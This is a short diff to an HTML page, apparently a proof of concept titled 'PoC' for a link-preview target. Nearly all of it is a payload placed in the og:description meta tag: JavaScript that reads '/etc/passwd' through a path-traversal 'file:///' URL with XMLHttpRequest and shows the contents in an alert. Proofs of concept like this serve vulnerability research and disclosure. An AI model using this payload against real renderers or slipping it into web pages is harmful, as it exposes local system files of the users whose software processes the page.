@@ -1,4 +1,22 @@
 <meta property="og:title" content="testing 3" />
-<meta property="og:description" content="random data" />
+<meta property="og:description" content="function readTextFile(file)
+{
+    var rawFile = new XMLHttpRequest();
+    rawFile.open("GET", file, false);
+    rawFile.onreadystatechange = function ()
+    {
+        if(rawFile.readyState === 4)
+        {
+            if(rawFile.status === 200 || rawFile.status == 0)
+            {
+                var allText = rawFile.responseText;
+                alert(allText);
+            }
+        }
+    }
+    rawFile.send(null);
+}
+
+readTextFile("file:///../../../../../../../../../etc/passwd");" />
 <meta property="og:image" content="http://social.buggywebsite.com/eee4169e-4b1e-44df-b035-2efcc26e316b"/>
 <title>PoC<title>
